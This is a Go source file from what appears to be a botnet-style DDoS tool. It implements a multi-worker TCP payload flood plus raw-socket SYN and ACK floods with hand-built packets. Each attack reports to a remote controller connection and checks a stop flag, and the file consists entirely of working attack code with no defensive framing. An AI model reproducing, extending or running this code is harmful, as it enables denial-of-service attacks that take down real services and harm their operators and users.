package tcp

import (
	"encoding/binary"
	"fmt"
	"math/rand"
	"net"
	"sync"
	"syscall"
	"time"

	"go_net/pkg/core"
)

func StartLegitFlood(targetIP string, port int, durationSecs int, conn net.Conn) {
	targetAddr := fmt.Sprintf("%s:%d", targetIP, port)

	endTime := time.Now().Add(time.Duration(durationSecs) * time.Second)

	var wg sync.WaitGroup
	numWorkers := 500

	for i := 0; i < numWorkers; i++ {
		wg.Add(1)
		go func(workerID int) {
			defer wg.Done()

			for time.Now().Before(endTime) {
				if core.GetAttackStop() {
					return
				}

				dialer := &net.Dialer{
					Timeout: time.Duration(1+rand.Intn(3)) * time.Second,
				}
				tcpConn, err := dialer.Dial("tcp", targetAddr)
				if err != nil {
					time.Sleep(10 * time.Millisecond)
					continue
				}

				if tcpConnTyped, ok := tcpConn.(*net.TCPConn); ok {
					tcpConnTyped.SetNoDelay(true)
					tcpConnTyped.SetWriteBuffer(1024 * 1024)
					tcpConnTyped.SetLinger(0)
				}

				connectionBroken := false
				for time.Now().Before(endTime) && !connectionBroken {
					if core.GetAttackStop() {
						tcpConn.Close()
						return
					}

					payloadSize := 8192 + rand.Intn(57000)
					payload := make([]byte, payloadSize)

					if rand.Intn(2) == 0 {
						rand.Read(payload)
					} else {
						for j := range payload {
							payload[j] = byte(j % 256)
						}
					}
					// tf is happening here
					chunkSize := 1024 + rand.Intn(4096)
					for offset := 0; offset < len(payload); offset += chunkSize {
						end := offset + chunkSize
						if end > len(payload) {
							end = len(payload)
						}
						_, err := tcpConn.Write(payload[offset:end])
						if err != nil {
							connectionBroken = true
							break
						}
					}
				}

				tcpConn.Close()
			}
		}(i)
	}

	wg.Wait()
	core.SendResponse(conn, fmt.Sprintf("INFO: TCP Flood on %s completed.", targetAddr))
}

const (
	IPV4_VERSION = 4
	IPV4_IHL     = 5
	IPPROTO_TCP  = 6
	TCP_SYN      = 0x02
	TCP_ACK      = 0x10
)

func calculateChecksum(data []byte) uint16 {
	var sum uint32
	length := len(data)

	for i := 0; i < length-1; i += 2 {
		sum += uint32(binary.BigEndian.Uint16(data[i:]))
	}
	// holy shit i hate go

	if length%2 == 1 {
		sum += uint32(data[length-1]) << 8
	}

	for sum>>16 > 0 {
		sum = (sum & 0xFFFF) + (sum >> 16)
	}

	return ^uint16(sum)
}

func buildSYNPacket(srcIPInt uint32, dstIP []byte, srcPort uint16, dstPort uint16, seqNum uint32, ttl uint8, packetID uint16, windowSize uint16) []byte {
	tcpHeaderLen := 20
	tcpOptionsLen := 20
	tcpTotalLen := tcpHeaderLen + tcpOptionsLen
	packetSize := 20 + tcpTotalLen
	packet := make([]byte, packetSize)

	packet[0] = (IPV4_VERSION << 4) | IPV4_IHL
	packet[1] = 0
	binary.BigEndian.PutUint16(packet[2:4], uint16(packetSize))
	binary.BigEndian.PutUint16(packet[4:6], packetID)
	binary.BigEndian.PutUint16(packet[6:8], 0)
	packet[8] = ttl
	packet[9] = IPPROTO_TCP
	binary.BigEndian.PutUint32(packet[12:16], srcIPInt)
	copy(packet[16:20], dstIP)
	binary.BigEndian.PutUint16(packet[10:12], calculateChecksum(packet[0:20]))

	tcpOffset := 20
	binary.BigEndian.PutUint16(packet[tcpOffset:tcpOffset+2], srcPort)
	binary.BigEndian.PutUint16(packet[tcpOffset+2:tcpOffset+4], dstPort)
	binary.BigEndian.PutUint32(packet[tcpOffset+4:tcpOffset+8], seqNum)
	binary.BigEndian.PutUint32(packet[tcpOffset+8:tcpOffset+12], 0)
	binary.BigEndian.PutUint16(packet[tcpOffset+12:tcpOffset+14], (10<<12)|TCP_SYN)
	binary.BigEndian.PutUint16(packet[tcpOffset+14:tcpOffset+16], windowSize)
	binary.BigEndian.PutUint16(packet[tcpOffset+18:tcpOffset+20], 0)
	// my ass used ai for ts
	optOffset := tcpOffset + 20
	packet[optOffset] = 2
	packet[optOffset+1] = 4
	binary.BigEndian.PutUint16(packet[optOffset+2:optOffset+4], 1460)

	packet[optOffset+4] = 3
	packet[optOffset+5] = 3
	packet[optOffset+6] = 7

	packet[optOffset+7] = 4
	packet[optOffset+8] = 2

	packet[optOffset+9] = 8
	packet[optOffset+10] = 10
	binary.BigEndian.PutUint32(packet[optOffset+11:optOffset+15], uint32(seqNum))
	binary.BigEndian.PutUint32(packet[optOffset+15:optOffset+19], 0)

	packet[optOffset+19] = 0

	pseudo := make([]byte, 12+tcpTotalLen)
	binary.BigEndian.PutUint32(pseudo[0:4], srcIPInt)
	copy(pseudo[4:8], dstIP)
	pseudo[8] = 0
	pseudo[9] = IPPROTO_TCP
	binary.BigEndian.PutUint16(pseudo[10:12], uint16(tcpTotalLen))
	copy(pseudo[12:], packet[tcpOffset:tcpOffset+tcpTotalLen])

	binary.BigEndian.PutUint16(packet[tcpOffset+16:tcpOffset+18], calculateChecksum(pseudo))

	return packet
}

func StartSYNFlood(targetIP string, targetPort int, durationSecs int, conn net.Conn) {
	ip := net.ParseIP(targetIP)
	if ip == nil || ip.To4() == nil {
		core.SendResponse(conn, "ERROR: Invalid IPv4 address.")
		return
	}
	dstIP := ip.To4()

	var srcIPInt uint32 = 0

	outConn, err := net.Dial("udp", "8.8.8.8:80")
	if err == nil {
		localAddr := outConn.LocalAddr().(*net.UDPAddr)
		srcIP := localAddr.IP.To4()
		srcIPInt = binary.BigEndian.Uint32(srcIP)
		outConn.Close()
	}

	endTime := time.Now().Add(time.Duration(durationSecs) * time.Second)

	var wg sync.WaitGroup
	numThreads := 20

	for i := 0; i < numThreads; i++ {
		wg.Add(1)
		go func(threadID int) {
			defer wg.Done()

			fd, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_RAW, syscall.IPPROTO_TCP)
			if err != nil {
				if threadID == 0 {
					core.SendResponse(conn, fmt.Sprintf("ERROR: Socket creation failed (Root needed?): %v", err))
				}
				return
			}
			defer syscall.Close(fd)

			if err := syscall.SetsockoptInt(fd, syscall.IPPROTO_IP, syscall.IP_HDRINCL, 1); err != nil {
				return
			}

			addr := syscall.SockaddrInet4{
				Port: 0,
			}
			copy(addr.Addr[:], dstIP)

			r := rand.New(rand.NewSource(time.Now().UnixNano() + int64(threadID)))
			seqSeed := r.Uint32()

			for time.Now().Before(endTime) {
				if core.GetAttackStop() {
					return
				}

				for j := 0; j < 50; j++ {
					srcPort := uint16(1024 + r.Intn(60000))
					seqNum := seqSeed + uint32(j*100)
					packetID := uint16(r.Intn(65535))

					pkt := buildSYNPacket(srcIPInt, dstIP, srcPort, uint16(targetPort), seqNum, 64, packetID, 64240)

					err := syscall.Sendto(fd, pkt, 0, &addr)
					if err != nil {
					}
				}
				time.Sleep(1 * time.Millisecond)
			}
		}(i)
	}

	wg.Wait()
	core.SendResponse(conn, fmt.Sprintf("INFO: SYN Flood on %s:%d completed.", targetIP, targetPort))
}

func buildACKPacket(srcIPInt uint32, dstIP []byte, srcPort uint16, dstPort uint16, seqNum uint32, ackNum uint32, ttl uint8, packetID uint16, windowSize uint16) []byte {
	tcpHeaderLen := 20
	packetSize := 20 + tcpHeaderLen
	packet := make([]byte, packetSize)

	packet[0] = (IPV4_VERSION << 4) | IPV4_IHL
	packet[1] = 0
	binary.BigEndian.PutUint16(packet[2:4], uint16(packetSize))
	binary.BigEndian.PutUint16(packet[4:6], packetID)
	binary.BigEndian.PutUint16(packet[6:8], 0)
	packet[8] = ttl
	packet[9] = IPPROTO_TCP
	binary.BigEndian.PutUint32(packet[12:16], srcIPInt)
	copy(packet[16:20], dstIP)
	binary.BigEndian.PutUint16(packet[10:12], calculateChecksum(packet[0:20]))

	tcpOffset := 20
	binary.BigEndian.PutUint16(packet[tcpOffset:tcpOffset+2], srcPort)
	binary.BigEndian.PutUint16(packet[tcpOffset+2:tcpOffset+4], dstPort)
	binary.BigEndian.PutUint32(packet[tcpOffset+4:tcpOffset+8], seqNum)
	binary.BigEndian.PutUint32(packet[tcpOffset+8:tcpOffset+12], ackNum)
	binary.BigEndian.PutUint16(packet[tcpOffset+12:tcpOffset+14], (5<<12)|TCP_ACK)
	binary.BigEndian.PutUint16(packet[tcpOffset+14:tcpOffset+16], windowSize)
	binary.BigEndian.PutUint16(packet[tcpOffset+18:tcpOffset+20], 0)

	pseudo := make([]byte, 12+tcpHeaderLen)
	binary.BigEndian.PutUint32(pseudo[0:4], srcIPInt)
	copy(pseudo[4:8], dstIP)
	pseudo[8] = 0
	pseudo[9] = IPPROTO_TCP
	binary.BigEndian.PutUint16(pseudo[10:12], uint16(tcpHeaderLen))
	copy(pseudo[12:], packet[tcpOffset:tcpOffset+tcpHeaderLen])

	binary.BigEndian.PutUint16(packet[tcpOffset+16:tcpOffset+18], calculateChecksum(pseudo))

	return packet
}

func StartACKFlood(targetIP string, targetPort int, durationSecs int, conn net.Conn) {
	ip := net.ParseIP(targetIP)
	if ip == nil || ip.To4() == nil {
		core.SendResponse(conn, "ERROR: Invalid IPv4 address.")
		return
	}
	dstIP := ip.To4()

	var srcIPInt uint32 = 0
	outConn, err := net.Dial("udp", "8.8.8.8:80")
	if err == nil {
		localAddr := outConn.LocalAddr().(*net.UDPAddr)
		srcIP := localAddr.IP.To4()
		srcIPInt = binary.BigEndian.Uint32(srcIP)
		outConn.Close()
	}

	endTime := time.Now().Add(time.Duration(durationSecs) * time.Second)

	var wg sync.WaitGroup
	numThreads := 20

	for i := 0; i < numThreads; i++ {
		wg.Add(1)
		go func(threadID int) {
			defer wg.Done()

			fd, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_RAW, syscall.IPPROTO_TCP)
			if err != nil {
				return
			}
			defer syscall.Close(fd)

			if err := syscall.SetsockoptInt(fd, syscall.IPPROTO_IP, syscall.IP_HDRINCL, 1); err != nil {
				return
			}

			addr := syscall.SockaddrInet4{
				Port: 0,
			}
			copy(addr.Addr[:], dstIP)

			r := rand.New(rand.NewSource(time.Now().UnixNano() + int64(threadID)))

			for time.Now().Before(endTime) {
				if core.GetAttackStop() {
					return
				}

				for j := 0; j < 50; j++ {
					srcPort := uint16(1024 + r.Intn(60000))
					seqNum := r.Uint32()
					ackNum := r.Uint32()
					packetID := uint16(r.Intn(65535))

					pkt := buildACKPacket(srcIPInt, dstIP, srcPort, uint16(targetPort), seqNum, ackNum, 64, packetID, 64240)

					_ = syscall.Sendto(fd, pkt, 0, &addr) // 50/50 this works btw
				}
				time.Sleep(1 * time.Millisecond) 
			}
		}(i)
	}

	wg.Wait()
	core.SendResponse(conn, fmt.Sprintf("INFO: ACK Flood on %s:%d completed.", targetIP, targetPort))
}
